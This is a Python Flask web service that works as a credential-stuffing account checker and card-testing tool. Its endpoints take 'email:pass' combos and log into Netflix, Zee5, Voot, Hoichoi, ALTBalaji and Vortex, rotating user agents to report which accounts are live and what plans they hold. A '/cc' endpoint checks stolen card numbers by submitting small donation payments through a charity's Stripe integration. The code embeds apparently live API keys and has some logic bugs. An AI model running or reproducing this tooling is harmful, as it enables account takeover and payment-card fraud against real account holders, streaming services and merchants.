import random
import string

from fake_useragent import UserAgent 
from bs4 import BeautifulSoup as Soup
import os
import requests
import datetime
from flask import Flask, jsonify, request, redirect

app = Flask(__name__)
app.secret_key = 'IshanSingla'


@app.route('/', methods=['GET', 'POST'])
def home():
    return redirect("https://t.me/InducedBots")


@app.route('/netflix', methods=['GET', 'POST'])
def netflix():
    from flask import Flask, jsonify, request, redirect
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "id is not defined idp='email:pass'"})

    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        client = requests.Session()
        login = client.get("https://www.netflix.com/login", headers={"User-Agent": UserAgent().random})
        soup = Soup(login.text, 'html.parser')
        loginForm = soup.find('form')
        authURL = loginForm.find('input', {'name': 'authURL'}).get('value')

        headers = {
                "user-agent": UserAgent().random, 
                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                "accept-language": "en-US,en;q=0.9", 
                "accept-encoding": "gzip, deflate, br", 
                "referer": "https://www.netflix.com/login", 
                "content-type": "application/x-www-form-urlencoded", 
                "cookie": ""
            }
        data = {
                "userLoginId:": inpumail,
                "password": inpupass, 
                "rememberMeCheckbox": "true", 
                "flow": "websiteSignUp", 
                "mode": "login", 
                "action": "loginAction",
                "withFields": "rememberMe,nextPage,userLoginId,password,countryCode,countryIsoCode", 
                "authURL": authURL, 
                "nextPage": "https://www.netflix.com/browse", 
                "countryCode": "+1", 
                "countryIsoCode": "US"
            }
        request = client.post("https://www.netflix.com/login", headers=headers, data=data)
        cookie = dict(flwssn=client.get("https://www.netflix.com/login", headers={ "User-Agent": UserAgent().random}).cookies.get("flwssn"))

        if 'Sorry, we can\'t find an account with this email address. Please try again or' or 'Incorrect password' in request.text:
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": "Login Unsucessfull"
            }
        else:
                info = client.get("https://www.netflix.com/YourAccount", headers={
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
                    "Accept-Encoding": "gzip, deflate, br", 
                    "Accept-Language": "en-US,en;q=0.9", 
                    "Connection": "keep-alive",
                    "Host": "www.netflix.com", 
                    "Referer": "https://www.netflix.com/browse",
                    "Sec-Fetch-Dest": "document", 
                    "Sec-Fetch-Mode": "navigate", 
                    "Sec-Fetch-Site": "same-origin", 
                    "Sec-Fetch-User": "?1", 
                    "Upgrade-Insecure-Requests": "1", 
                    "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
                }, cookies=cookie, timeout=10).text
                plan = info.split( 'data-uia="plan-label"><b>')[1].split('</b>')[0]
                country = info.split('","currentCountry":"')[1].split('"')[0]
                expiry = info.split('data-uia="nextBillingDate-item">')[1].split('<')[0]
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "plan": plan,
                    "autorenewal": country,
                    "validity": f"{expiry}",
                }

        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/hoichoi', methods=['GET', 'POST'])
def hoichoi():
    head = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': 'application/json, text/plain, */*',
        'content-type': 'aapplication/json;charset=UTF-8',
        'origin': 'https://www.hoichoi.tv',
        'referer': 'https://www.hoichoi.tv/',
    }
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "id is not defined idp='email:pass'"})

    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        session_requests = requests.session()
        payload = '{%s,%s}' % (f'"email": "{inpumail}"',
                               f'"password":"{inpupass}"')
        result = session_requests.post(
            'https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-f76c181a-94b5-11eb-a8b3-0242ac130003', data=payload, headers=head)
        response = result.json()
        if result.status_code != 200:
            code = response['code']
            messg = response['error']
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": messg
            }
        elif result['isSubscribed'] == False:
            ishan = {
                "stats": "Sucessfull",
                "idp": idp,
                "validity": "Expired",
            }
        else:
            acess = response['authorizationToken']
            head2 = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
                'accept': 'application/json, text/plain, */*',
                'authorization': acess,
                'origin': 'https://www.hoichoi.tv',
                'referer': 'https://www.hoichoi.tv/',
                'x-api-key': 'PBSooUe91s7RNRKnXTmQG7z3gwD2aDTA6TlJp6ef'
            }
            response = session_requests.get(
                'https://prod-api.viewlift.com/subscription/user?site=hoichoitv&userId=f76c181a-94b5-11eb-a8b3-0242ac130003', headers=head2)
            result = response.json()
            timedioint = result["subscriptionInfo"]["subscriptionEndDate"].split('T')[
                0]
            sub2split = timedioint.split('-')
            days = datetime.date(int(sub2split[0]), int(
                sub2split[1]), int(sub2split[2])) - datetime.date.today()
            Pack_name = result["subscriptionPlanInfo"]["name"]
            Pack_recur = result["subscriptionPlanInfo"]["renewable"]
            ishan = {
                "stats": "Sucessfull",
                "idp": idp,
                "plan": Pack_name,
                "autorenewal": Pack_recur,
                "validity": f"{days.days}",
            }
        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route('/vortex', methods=['GET', 'POST'])
def vortex():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "id is not defined idp='email:pass'"})
    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        session_requests = requests.session()
        payload = '{%s,%s}' %(f'"email": "{inpumail}"', f'"password":"{inpupass}"')
        result = session_requests.post('https://vortex-api.gg/login', data=payload)
        response = result.json()
        if result.status_code != 200:
            msg = response['message']
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": msg
            }
        else:
            acess = response['session_token']
            head2 = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
                'accept': 'application/json, text/plain, */*',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'content-type': 'application/json',
                'xssession': str(acess),
            }

            response = session_requests.get('https://vortex-api.gg/login', headers=head2)
            result = response.json()
            
            if result['orders'] == []:
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "validity": "Free",
                }
            validto = result['orders'][0]['dates']['valid_to']
            validtosplit = validto.split('T')[0]
            sub2split = validtosplit.split('-')
            trial = datetime.date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) < datetime.date.today() 
            if trial:
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "validity": "Expired",
                }
            else:
                days = datetime.date(int(sub2split[0]), int(sub2split[1]), int(sub2split[2])) - datetime.date.today()
                subscription = result['orders'][0]['product']['titles']
                Pack_name = subscription['default']
                Pack_recur = str(result['orders'][0]['product']['recurring'])
                Pack_date = subscription['en']
                ishan = {
                        "stats": "Sucessfull",
                        "idp": idp,
                        "plan": f"{Pack_name} {Pack_date}",
                        "autorenewal": Pack_recur,
                        "validity": f"{days.days}",
                    }
        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})

@app.route('/voot', methods=['GET', 'POST'])
def voot():
    head = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'sec-fetch-site': 'cross-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'content-type': 'application/json;charset=UTF-8',
    }
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "id is not defined idp='email:pass'"})

    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        session_requests = requests.session()
        payload = '{"type":"traditional","deviceId":"X11","deviceBrand":"PC/MAC","data":{%s,%s}}' % (
            f'"email": "{inpumail}"', f'"password":"{inpupass}"')
        result = session_requests.post(
            "https://userauth.voot.com/usersV3/v3/login", data=payload, headers=head)
        response = result.json()
        if result.status_code != 200:
            code = response['status']['code']
            msg = response['status']['message']
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": msg
            }
        else:
            acess = response['data']['authToken']['accessToken']
            head2 = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'accesstoken': str(acess),
            }
            response = session_requests.get(
                'https://pxapi.voot.com/smsv4/int/ps/v1/voot/transaction/list', headers=head2)
            result = response.json()
            total = result['results']['total']
            if int(total) == 0:
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "validity": "Expired",
                }
            else:
                pay_list = result['results']['list'][0]
                ts = int(pay_list['endDate']['timeStamp'])
                try:
                    human = datetime.datetime.utcfromtimestamp(ts)
                except ValueError:
                    human = datetime.datetime.fromtimestamp(ts/1000.0)

                if human < datetime.datetime.today():
                    ishan = {
                        "stats": "Sucessfull",
                        "idp": idp,
                        "validity": "Expired",
                    }
                else:
                    Pack_name = pay_list['itemDetails']['name']
                    Pack_recur = pay_list['itemDetails']['isRenewable']
                    days = human - datetime.datetime.today()
                    ishan = {
                        "stats": "Sucessfull",
                        "idp": idp,
                        "plan": Pack_name,
                        "autorenewal": Pack_recur,
                        "validity": f"{days.days}",
                    }
        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route('/zee5', methods=['GET', 'POST'])
def zee5():
    head = {
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
        'accept': 'application/json',
        'content-type': 'application/json',
    }
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "idp is not defined idp='email:pass'"})

    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        session_requests = requests.session()
        payload = '{%s,%s}' % (f'"email": "{inpumail}"',
                               f'"password":"{inpupass}"')
        result = session_requests.post(
            "https://userapi.zee5.com/v2/user/loginemail", data=payload, headers=head)
        response = result.json()
        if result.status_code != 200:
            code = response['code']
            msg = response['message']
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": msg
            }
        else:
            acess = response['access_token']
            head2 = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
                'accept': '*/*',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'authorization': 'bearer '+str(acess),
            }
            response = session_requests.get(
                'https://subscriptionapi.zee5.com/v1/subscription?translation=en&country=IN&include_all=flase', headers=head2)
            result = response.json()

            if result == []:
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "validity": "Expired",
                }
            else:
                timedioint = result[0]["subscription_end"].split('T')[0]
                sub2split = timedioint.split('-')
                days = datetime.date(int(sub2split[0]), int(
                    sub2split[1]), int(sub2split[2])) - datetime.date.today()
                Pack_name = result[0]['subscription_plan']['title']
                Pack_recur = result[0]['recurring_enabled']
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "plan": Pack_name,
                    "autorenewal": Pack_recur,
                    "validity": days.days
                }
        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route('/alt', methods=['GET', 'POST'])
def alt():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "idp is not defined idp='email:pass'"})

    try:
        try:
            combo_split = idp.split(':')
            inpumail = combo_split[0]
            inpupass = combo_split[1]
        except IndexError:
            return jsonify({"error": "Code is required to create a Carbon!"})
        session_requests = requests.session()
        payload = '{%s,%s}' % (f'"username": "{inpumail}"',
                               f'"password":"{inpupass}"')
        result = session_requests.post(
            'https://api.cloud.altbalaji.com/accounts/login?domain=IN', data=payload)
        response = result.json()
        if result.status_code != 200:
            state = response['status']
            code = response['code']
            msg = response['message']
            ishan = {
                "stats": "Unsucessfull",
                "idp": idp,
                "msg": msg
            }
        else:
            acess = response['session_token']
            head2 = {
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36',
                'accept': 'application/json, text/plain, */*',
                'sec-fetch-site': 'same-site',
                'sec-fetch-mode': 'cors',
                'sec-fetch-dest': 'empty',
                'content-type': 'application/json',
                'xssession': str(acess),
            }
            response = session_requests.get(
                'https://payment.cloud.altbalaji.com/accounts/orders?limit=1&domain=IN', headers=head2)
            result = response.json()

            if result['orders'] == []:
                ishan = {
                    "stats": "Sucessfull",
                    "idp": idp,
                    "validity": "Expired",
                }
            else:
                validto = result['orders'][0]['dates']['valid_to']
                validtosplit = validto.split('T')[0]
                sub2split = validtosplit.split('-')
                trial = datetime.date(int(sub2split[0]), int(
                    sub2split[1]), int(sub2split[2])) < datetime.date.today()
                if trial:
                    ishan = {
                        "stats": "Sucessfull",
                        "idp": idp,
                        "validity": "Expired",
                    }
                else:
                    days = datetime.date(int(sub2split[0]), int(
                        sub2split[1]), int(sub2split[2])) - datetime.date.today()
                    subscription = result['orders'][0]['product']['titles']
                    Pack_name = subscription['default']
                    Pack_recur = str(result['orders'][0]
                                     ['product']['recurring'])
                    Pack_date = subscription['en']
                    ishan = {
                        "stats": "Sucessfull",
                        "idp": idp,
                        "plan": Pack_name,
                        "autorenewal": Pack_recur.capitalize(),
                        "validity": days.days
                    }
        return jsonify(ishan)
    except Exception as e:
        return jsonify({"error": str(e)})


@app.route('/cc', methods=['GET', 'POST'])
def cc():
    data = None
    if request.method == "POST":
        data = request.json
        try:
            idp = data['idp']
        except:
            idp = None
    else:
        idp = request.args.get('idp')

    if idp is None:
        return jsonify({"error": "idp is not defined idp='4543563405874531|07|2025|508'"})
    try:
        cc = idp
        splitter = cc.split('|')
        ccn = splitter[0]
        mm = splitter[1]
        yy = splitter[2]
        cvv = splitter[3]
        rnd = ''.join((random.choice(string.ascii_lowercase)
                      for x in range(10)))
        email = f"{str(rnd)}@gmail.com"
        BIN = cc[:6]
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4571.0 Safari/537.36 Edg/93.0.957.0",
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/x-www-form-urlencoded"
        }
        s = requests.post("https://m.stripe.com/6", headers=headers)
        r = s.json()
        Guid = r["guid"]
        Muid = r["muid"]
        Sid = r["sid"]
        payload = {
            "lang": "en",
            "type": "donation",
            "currency": "USD",
            "amount": "5",
            "custom": "x-0-b43513cf-721e-4263-8d1d-527eb414ea29",
            "currencySign": "$"
        }
        head = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "*/*",
            "Origin": "https://adblockplus.org",
            "Sec-Fetch-Dest": "empty",
            "Referer": "https://adblockplus.org/",
            "Accept-Language": "en-US,en;q=0.9"
        }
        re = requests.post(
            "https://new-integration.adblockplus.org/", data=payload, headers=head)
        client = re.text
        pi = client[0:27]
        load = {
            "receipt_email": email,
            "payment_method_data[type]": "card",
            "payment_method_data[billing_details][email]": email,
            "payment_method_data[card][number]": ccn,
            "payment_method_data[card][cvc]": cvv,
            "payment_method_data[card][exp_month]": mm,
            "payment_method_data[card][exp_year]": yy,
            "payment_method_data[guid]": Guid,
            "payment_method_data[muid]": Muid,
            "payment_method_data[sid]": Sid,
            "payment_method_data[payment_user_agent]": "stripe.js/af38c6da9;+stripe-js-v3/af38c6da9",
            "payment_method_data[referrer]": "https://adblockplus.org/",
            "expected_payment_method_type": "card",
            "use_stripe_sdk": "true",
            "webauthn_uvpa_available": "true",
            "spc_eligible": "false",
            "key": "pk_live_Nlfxy49RuJeHqF1XOAtUPUXg00fH7wpfXs",
            "client_secret": client
        }
        header = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
            "Content-Type": "application/x-www-form-urlencoded",
            "Accept": "application/json",
            "Origin": "https://js.stripe.com",
            "Referer": "https://js.stripe.com/",
            "Accept-Language": "en-US,en;q=0.9"
        }
        rx = requests.post(
            f"https://api.stripe.com/v1/payment_intents/{pi}/confirm", data=load, headers=header)
        res = rx.json()
        msg = res["error"]["message"]
        if "incorrect_cvc" in rx.text:
            stats = "#ApprovedCCN"
        elif "Unrecognized request URL" in rx.text:
            stats = "PROXIES ERROR"
        elif rx.status_code == 200:
            stats = "ApprovedCVV"
        else:
            stats = "Declined"
        return jsonify({
            "cc": cc,
            "status": stats,
            "bin": BIN,
            "mes": msg,
        })
    except Exception as e:
        return jsonify({"error": str(e)})


if __name__ == "__main__":
    app.run(debug=True, use_reloader=True, threaded=True,
            host='127.0.0.1', port=os.getenv('PORT', 9050))
